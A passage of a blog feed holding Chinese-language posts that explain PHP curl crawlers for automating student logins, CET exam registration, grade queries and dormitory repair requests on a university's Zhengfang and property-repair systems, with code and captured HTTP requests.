class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$add_url1 = &apos;http://localhost/Repair/jsp/student/repair_add.jsp&apos;;</span><br><span class="line">$add_con=login_post($add_url1  ,$cookie,&apos;&apos;);</span><br><span class="line">preg_match_all(&apos;/&lt;input.+?(value=\&quot;(.+?)\&quot;)/&apos;,$add_con, $view); //获取__VIEWSTATE字段并存到$view数组中</span><br><span class="line">//var_dump($view[1][1]);</span><br><span class="line">preg_match_all($patterns,$view[1][1],$arr3);</span><br><span class="line">$tusersid = $arr3[0][0];</span><br><span class="line"></span><br><span class="line">$updateAddress_url = &apos;http://localhost/Repair/StudentServlet?flag=updateAddress&apos;;</span><br><span class="line">$updateAddress_post=array(</span><br><span class="line">&apos;tId&apos; =&gt; $tusersid,</span><br><span class="line">&apos;districtname&apos; =&gt; $districtname,</span><br><span class="line">&apos;floorid&apos; =&gt; $floorid,</span><br><span class="line">&apos;dormitoryid&apos; =&gt; $dormitoryid</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$updateAddress_con = login_post($updateAddress_url,$cookie,http_build_query($updateAddress_post));</span><br></pre></td></tr></table></figure><p>将变量值传入更新用户的地址信息。</p><p>接下来就是提交报修信息了，也是用到一个post请求包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$repair_add_url = &quot;http://localhost/Repair/StudentServlet?userId=&quot;.$userId;</span><br><span class="line">$repair_add_post=array(</span><br><span class="line">&apos;flag&apos;=&gt; &apos;repairAdd&apos;,</span><br><span class="line">&apos;tusersid&apos; =&gt; $tusersid,</span><br><span class="line">&apos;districtname&apos; =&gt; $districtname,</span><br><span class="line">&apos;floorid&apos; =&gt; $floorid,</span><br><span class="line">&apos;dormitoryid&apos;=&gt; $dormitoryid,</span><br><span class="line">&apos;phone&apos; =&gt; $phone,</span><br><span class="line">&apos;goodsType&apos; =&gt; $type1,</span><br><span class="line">&apos;goodsid&apos; =&gt; $type2,</span><br><span class="line">&apos;describe&apos;=&gt; $describe</span><br><span class="line">);</span><br><span class="line">$repair_add_con = login_post($repair_add_url,$cookie,http_build_query($repair_add_post));</span><br></pre></td></tr></table></figure><p>到这里模拟提交报修信息的工作就完成了，后续我还做了一个简单的判断，判断是否登录成功。</p><h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><p><a href="https://github.com/uknowsec/RepairCrawler" target="_blank" rel="noopener">https://github.com/uknowsec/RepairCrawler</a></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://segmentfault.com/q/1010000011880594" target="_blank" rel="noopener">select二级联动</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前面两个爬虫都是基于正方教务系统的，这个爬虫是根据学校的一个物业报修系统写的。&lt;/p&gt;
&lt;p&gt;login_baoxiu.php页面有用到一个
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP爬虫-正方教务系统一键报名四六级</title>
    <link href="https://uknowsec.cn/posts/notes/PHP%E7%88%AC%E8%99%AB-%E6%AD%A3%E6%96%B9%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F%E4%B8%80%E9%94%AE%E6%8A%A5%E5%90%8D%E5%9B%9B%E5%85%AD%E7%BA%A7.html"/>
    <id>https://uknowsec.cn/posts/notes/PHP爬虫-正方教务系统一键报名四六级.html</id>
    <published>2018-03-23T05:12:27.000Z</published>
    <updated>2018-05-03T10:01:20.593Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在我们学校四六级也是在正方教务系统进行报名的，login页面是跟查询成绩绩点的差不多，就是添加了几个表单数据。</p><p>require页面中一点点区别，模拟登录和之前的成绩绩点爬取是一样的。在报名页面有个地方是很关键的。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="login-cet-php"><a href="#login-cet-php" class="headerlink" title="login_cet.php"></a>login_cet.php</h3><p>login_cet.php页面跟login_grade.php是差不多的，获取到cookie和验证码保存到本地。</p><p>以下是提交表单界面</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/psb1.png" alt=""></p><h3 id="require-cet-php"><a href="#require-cet-php" class="headerlink" title="require_cet.php"></a>require_cet.php</h3><p>在前言说到，模拟登录跟之前是一样的，加之目前学校已经关闭了报名页面，所以无法抓包。</p><h3 id="Posting-multipart-form-data-using-curl-in-PHP"><a href="#Posting-multipart-form-data-using-curl-in-PHP" class="headerlink" title="Posting multipart form data using curl in PHP"></a>Posting multipart form data using curl in PHP</h3><p>如下代码demo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, &quot;http://localhost:8888&quot;);</span><br><span class="line">curl_setopt($ch, CURLOPT_CUSTOMREQUEST, &apos;POST&apos;);</span><br><span class="line">curl_setopt($ch, CURLOPT_POSTFIELDS, array(&apos;a&apos; =&gt; &apos;b&apos;, &apos;c&apos; =&gt; &apos;d&apos;));</span><br><span class="line">curl_exec($ch);</span><br></pre></td></tr></table></figure><p>以上是一个简单的curl发送一个POST请求</p><p>这个demo的产生request如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: localhost:8888</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 228</span><br><span class="line">Expect: 100-continue</span><br><span class="line">Content-Type: multipart/form-data; boundary=------------------------f287dd3807057a2c</span><br><span class="line"></span><br><span class="line">--------------------------f287dd3807057a2c</span><br><span class="line">Content-Disposition: form-data; name=&quot;a&quot;</span><br><span class="line">Content-Length: 1</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">--------------------------f287dd3807057a2c</span><br><span class="line">Content-Disposition: form-data; name=&quot;c&quot;</span><br><span class="line">Content-Length: 1</span><br><span class="line"></span><br><span class="line">d</span><br><span class="line">--------------------------f287dd3807057a2c--</span><br></pre></td></tr></table></figure><p>从以上代码中总结出的就是，在curl_setopt($ch, CURLOPT_POSTFIELDS, $post)这个函数中，</p><p>如果$post是字符串，则Content-Type是application/x-www-form-urlencoded。</p><p>如果$post是k=&gt;v的数组，则Content-Type是multipart/form-data</p><p>在这里因为这个爬虫中，确定提交的POST包的Content-Type是multipart/form-data。</p><p>所以这里有用到这个知识点。代码如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$params=[&apos;__EVENTTARGET&apos; =&gt; &apos;&apos;,&apos;__EVENTARGUMENT&apos;=&gt;&apos;&apos;,&apos;__VIEWSTATE&apos;=&gt;$state,&apos;txtxxmc&apos;=&gt;&apos;&apos;,$cet=&gt;&apos;on&apos;,&apos;txtSFZH&apos;=&gt;$idcard,&apos;btnSubmit&apos;=&gt;&apos;确 定&apos;,&apos;TextBox1&apos;=&gt;&apos;&apos;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function post_cet($url2,$cookie,$params)</span><br><span class="line">&#123;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url2);</span><br><span class="line">curl_setopt($ch, CURLOPT_POST, true);</span><br><span class="line">curl_setopt($ch,CURLOPT_HTTPHEADER,array(</span><br><span class="line">&apos;User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&apos;,</span><br><span class="line">&apos;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&apos;,</span><br><span class="line">&apos;Accept-Encoding: gzip, deflate&apos;,</span><br><span class="line">&apos;Accept-Language: zh-CN,zh;q=0.9&apos;,</span><br><span class="line">&apos;Upgrade-Insecure-Requests: 1&apos;,</span><br><span class="line">&apos;Cache-Control: max-age=0&apos;</span><br><span class="line">));</span><br><span class="line">curl_setopt($ch, CURLOPT_REFERER, $url2);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);  //不自动输出数据，要echo才行</span><br><span class="line">curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);</span><br><span class="line">curl_setopt($ch, CURLOPT_POSTFIELDS, $params);</span><br><span class="line">//curl_setopt($ch, CURLINFO_HEADER_OUT, TRUE);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">//echo curl_getinfo($ch, CURLINFO_HEADER_OUT);</span><br><span class="line">curl_close($ch);</span><br><span class="line">return $response;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$con3=post_cet($url2,$cookie,$params);</span><br></pre></td></tr></table></figure><p>以上的代码就可以实现提交确认POST数据报了，接下来我还做了个简单的判断，判断是否报名成功。</p><p>如果报名成功了，页面会有报名记录的。这里因为无法抓包，就只能根据代码说明了。</p><p>这里我没有使用正则匹配，用到的xpath定位。</p><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">$con3=post_cet($url2,$cookie,$params);</span><br><span class="line">//echo $con3;</span><br><span class="line">// create document object model</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">// load html into document object model</span><br><span class="line">@$dom-&gt;loadHTML($con3);</span><br><span class="line">// create domxpath instance</span><br><span class="line">$xPath = new DOMXPath($dom);</span><br><span class="line">// get all elements with a particular id and then loop through and print the href attribute</span><br><span class="line">$elements = $xPath-&gt;query(&apos;//*[@id=&quot;DBGridInfo&quot;]/tbody/tr[2]&apos;);</span><br><span class="line">if($elements)&#123;</span><br><span class="line">echo&apos;</span><br><span class="line">&lt;div class=&quot;weui-msg&quot;&gt;</span><br><span class="line">&lt;div class=&quot;weui-msg__icon-area&quot;&gt;&lt;i class=&quot;weui-icon-success weui-icon_msg&quot;&gt;&lt;/i&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;weui-msg__text-area&quot;&gt;</span><br><span class="line">&lt;h2 class=&quot;weui-msg__title&quot;&gt;报考成功&lt;/h2&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;weui-msg__opr-area&quot;&gt;</span><br><span class="line">&lt;p class=&quot;weui-btn-area&quot;&gt;</span><br><span class="line">&lt;a href=&quot;javascript:;&quot; onClick=&quot;location.href=document.referrer&quot; class=&quot;weui-btn weui-btn_primary&quot;&gt;返回&lt;/a&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo&apos;</span><br><span class="line">&lt;div class=&quot;weui-msg&quot;&gt;</span><br><span class="line">&lt;div class=&quot;weui-msg__icon-area&quot;&gt;&lt;i class=&quot;weui-icon-warn weui-icon_msg&quot;&gt;&lt;/i&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;weui-msg__text-area&quot;&gt;</span><br><span class="line">&lt;h2 class=&quot;weui-msg__title&quot;&gt;报考失败,请返回重试&lt;/h2&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;weui-msg__opr-area&quot;&gt;</span><br><span class="line">&lt;p class=&quot;weui-btn-area&quot;&gt;</span><br><span class="line">&lt;a href=&quot;javascript:;&quot; onClick=&quot;location.href=document.referrer&quot; class=&quot;weui-btn weui-btn_primary&quot;&gt;返回&lt;/a&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//*[@id=&quot;DBGridInfo&quot;]/tbody/tr[2]</span><br></pre></td></tr></table></figure><p>是需要判断的xpath路径，更加匹配该地址的值来判断是否实现报名。</p><h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><p><a href="https://github.com/uknowsec/CETCrawler" target="_blank" rel="noopener">https://github.com/uknowsec/CETCrawler</a></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://titohernandez.com/titohernandez/posting-multipart-form-data-using-curl-in-php/" target="_blank" rel="noopener">Posting multipart form data using curl in PHP.</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在我们学校四六级也是在正方教务系统进行报名的，login页面是跟查询成绩绩点的差不多，就是添加了几个表单数据。&lt;/p&gt;
&lt;p&gt;require
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP爬虫-正方教务系统爬取成绩绩点</title>
    <link href="https://uknowsec.cn/posts/notes/PHP%E7%88%AC%E8%99%AB-%E6%AD%A3%E6%96%B9%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F%E7%88%AC%E5%8F%96%E6%88%90%E7%BB%A9%E7%BB%A9%E7%82%B9.html"/>
    <id>https://uknowsec.cn/posts/notes/PHP爬虫-正方教务系统爬取成绩绩点.html</id>
    <published>2018-03-23T05:12:07.000Z</published>
    <updated>2018-05-03T10:01:20.595Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>从去年寒假开始，学校的一些二级域名就对外网访问进行了限制。而在校内同学们宿舍普遍是用的电信网，要使用内网需要到教学区域连学校的wifi才行。这样是很不方便的。</p><p>寒假一直想写个正方教务系统爬虫的，一直拖着拖着的没有完成。开学这一段时间挺闲的，目前完成了正方教务系统爬取成绩绩点和另外两个小项目，一个是正方系统一键报名四六级，一个是物业报修系统一键物业报修。这三个爬虫目前挂在自己的个人服务器上，以某种手段访问内网，后续会转移到内网服务器，转发到外网，提高访问速度。</p><p>习惯了，用博客记录自己写的东西，这里简单记录下正方教务系统爬虫成绩绩点的过程。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="UI设计"><a href="#UI设计" class="headerlink" title="UI设计"></a>UI设计</h3><p>这里提下这个登陆表单和后端的UI界面，这里是借鉴了我在Github上看到的一个类似的项目</p><p><a href="https://github.com/wangyufeng0615/bjuthelper" target="_blank" rel="noopener">https://github.com/wangyufeng0615/bjuthelper</a></p><p>整个项目跟上述的项目有点类似，都是正方系统，仅仅是在一些小小的地方有区别。</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/psb.png" alt=""></p><h3 id="login-grade-php"><a href="#login-grade-php" class="headerlink" title="login_grade.php"></a>login_grade.php</h3><p>在上面项目中，个别院校的教务系统是有无需验证码的接口的。而在我们学校是没有的，这里我们需要先获取到验证码</p><p>这里用到PHP中的CURL进行获取验证码，并把访问页面的cookie保存到本地。并把验证码图片保存到本地。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$rand_id = rand(100000, 999999);    //for verifycode</span><br><span class="line">require_verify_code();  //获取验证码</span><br><span class="line">function require_verify_code()&#123;</span><br><span class="line">    $cookie = dirname(__FILE__).&apos;/cookie/&apos;.$_SESSION[&apos;id&apos;].&apos;.txt&apos;;    //cookie路径  </span><br><span class="line">    $verify_code_url = &quot;http://localhost/CheckCode.aspx&quot;;      //验证码地址</span><br><span class="line">    $curl = curl_init();</span><br><span class="line">    curl_setopt($curl, CURLOPT_URL, $verify_code_url);</span><br><span class="line">    curl_setopt($curl, CURLOPT_COOKIEJAR, $cookie);                     //保存cookie</span><br><span class="line">    curl_setopt($curl, CURLOPT_HEADER, 0);</span><br><span class="line">    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">    $img = curl_exec($curl);                                            //执行curl</span><br><span class="line">    curl_close($curl);</span><br><span class="line">    global $rand_id;</span><br><span class="line">    $path_of_verifyCode =dirname(__FILE__).&apos;/verifyCodes/verifyCode_&apos;.$rand_id.&apos;.jpg&apos;;</span><br><span class="line">    $fp = fopen($path_of_verifyCode,&quot;w&quot;);                                  //文件名</span><br><span class="line">    fwrite($fp,$img);                                                   //写入文件</span><br><span class="line">    fclose($fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>login_grade后面的页面就是利用WEUI写得一个提交表单了，这里就不要过多的说了。</p><h3 id="require-grade-php"><a href="#require-grade-php" class="headerlink" title="require_grade.php"></a>require_grade.php</h3><h4 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h4><p>这里还是先简单的抓包分析，先抓登录页面的POST请求包。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /Default2.aspx HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: 207</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://localhost/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: UM_distinctid=161e202e63c6d9-094afdbce42fa2-3b60450b-1fa400-161e202e63d5b7; ASP.NET_SessionId=ht5hadjnbrhcbebuqa3khb3s</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">__VIEWSTATE=dDwtNTE2MjI4MTQ7Oz7j2BjEQ4cDEffr%2BK8yeXHBPnpEJg%3D%3D&amp;txtUserName=username&amp;Textbox1=&amp;TextBox2=password&amp;txtSecretCode=3vrd&amp;RadioButtonList1=%D1%A7%C9%FA&amp;Button1=&amp;lbLanguage=&amp;hidPdrs=&amp;hidsc=</span><br></pre></td></tr></table></figure><p>简单的看下POST提交的参数有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__VIEWSTATE=</span><br><span class="line"></span><br><span class="line">txtUserName=</span><br><span class="line"></span><br><span class="line">Textbox1=</span><br><span class="line"></span><br><span class="line">TextBox2=</span><br><span class="line"></span><br><span class="line">txtSecretCode=</span><br><span class="line"></span><br><span class="line">RadioButtonList1=</span><br><span class="line"></span><br><span class="line">&amp;Button1=&amp;lbLanguage=&amp;hidPdrs=&amp;hidsc=</span><br></pre></td></tr></table></figure><p>其中txtUserName是学号，TextBox2是密码，txtSecretCode是验证码，后面的参数直接默认提交就行。</p><p>这里重点的是__VIEWSTATE参数，这个参数是在登录页面里的。需要去获取这个参数，来找下这个参数的位置。</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/viewstate.png" alt=""></p><p>这里我们需要得到这个value值,这里我们需要代入login_grade页面里的cookie放入得到响应的vivewstate值</p><p>同样利用curl来访问。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  //function: 构造post数据并登陆</span><br><span class="line">  function login_post($url,$cookie,$post)&#123;</span><br><span class="line">global $cookie;</span><br><span class="line">      $ch = curl_init();</span><br><span class="line">      curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">      curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">      curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);  //不自动输出数据，要echo才行</span><br><span class="line">      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  //重要，抓取跳转后数据</span><br><span class="line">      curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie); </span><br><span class="line">      curl_setopt($ch, CURLOPT_REFERER, &apos;http://localhost/default2.aspx&apos;);  //重要，302跳转需要referer，可以在Request Headers找到 </span><br><span class="line">      curl_setopt($ch, CURLOPT_POSTFIELDS,$post);  //post提交数据</span><br><span class="line">      $result=curl_exec($ch);</span><br><span class="line">      curl_close($ch);</span><br><span class="line">      return $result;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$url=&quot;http://localhost/default2.aspx&quot;;  //教务地址</span><br><span class="line">$con1=login_post($url,$cookie,&apos;&apos;);               //登陆</span><br><span class="line">preg_match_all(&apos;/&lt;input type=&quot;hidden&quot; name=&quot;__VIEWSTATE&quot; value=&quot;([^&lt;&gt;]+)&quot; \/&gt;/&apos;, $con1, $view); //获取__VIEWSTATE字段并存到$view数组中</span><br></pre></td></tr></table></figure><p>传入教务网地址，访问登录页面，利用preg_match_all函数正则匹配到页面里的__VIEWSTATE的value值。</p><p>参数都准备好了，可以模拟登录了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">   $_SESSION[&apos;xh&apos;]=$_POST[&apos;account&apos;];</span><br><span class="line">   $xh=$_POST[&apos;account&apos;];</span><br><span class="line">   $pw=$_POST[&apos;password&apos;];</span><br><span class="line">   $current_year=$_POST[&apos;current_year&apos;];</span><br><span class="line">   $current_term=$_POST[&apos;current_term&apos;];</span><br><span class="line">   $code= $_POST[&apos;verify_code&apos;];</span><br><span class="line">   $cookie = dirname(__FILE__) . &apos;/cookie/&apos;.$_SESSION[&apos;id&apos;].&apos;.txt&apos;;</span><br><span class="line"></span><br><span class="line">$post=array(</span><br><span class="line">       &apos;__VIEWSTATE&apos;=&gt;$view[1][0],</span><br><span class="line">       &apos;txtUserName&apos;=&gt;$xh,</span><br><span class="line">       &apos;TextBox2&apos;=&gt;$pw,</span><br><span class="line">       &apos;txtSecretCode&apos;=&gt;$code,</span><br><span class="line">       &apos;RadioButtonList1&apos;=&gt;iconv(&apos;utf-8&apos;, &apos;gb2312&apos;, &apos;学生&apos;),</span><br><span class="line">       &apos;Button1&apos;=&gt;iconv(&apos;utf-8&apos;, &apos;gb2312&apos;, &apos;登录&apos;),</span><br><span class="line">       &apos;lbLanguage&apos;=&gt;&apos;&apos;,</span><br><span class="line">       &apos;hidPdrs&apos;=&gt;&apos;&apos;,</span><br><span class="line">       &apos;hidsc&apos;=&gt;&apos;&apos;</span><br><span class="line">   );</span><br><span class="line">   $con2=login_post($url,$cookie,http_build_query($post));</span><br></pre></td></tr></table></figure><p>这样我们就成功的登录到教务系统了，接下来我们需要跳转到成绩页面。</p><p>同样抓包分析，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /xscjcx.aspx?xh=1111111 HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: 3839</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://localhost/xscjcx.aspx?xh=208150815&amp;xm=%B3%C9%CF%E9%D4%C0&amp;gnmkdm=N121617</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: UM_distinctid=161e202e63c6d9-094afdbce42fa2-3b60450b-1fa400-161e202e63d5b7; ASP.NET_SessionId=ht5hadjnbrhcbebuqa3khb3s</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">__EVENTTARGET=&amp;__EVENTARGUMENT=&amp;__VIEWSTATE=dDw&amp;hidLanguage=&amp;ddlXN=2017-2018&amp;ddlXQ=1&amp;ddl_kcxz=&amp;btn_xq=%D1%A7%C6%DA%B3%C9%BC%A8</span><br></pre></td></tr></table></figure><p>这里是查询用户选择学期的POST请求包，url里的/xscjcx.aspx?xh=中的xh是用户学号。</p><p>POST参数里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__EVENTTARGET=&amp;__EVENTARGUMENT=&amp;__VIEWSTATE=dDw&amp;hidLanguage=&amp;ddlXN=2017-2018&amp;ddlXQ=1&amp;ddl_kcxz=&amp;btn_xq=%D1%A7%C6%DA%B3%C9%BC%A8</span><br></pre></td></tr></table></figure><p>这几个参数都可以看出他们的意思，重要的是获取__VIEWSTATE的value值，同样利用一个正则去获取这个值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 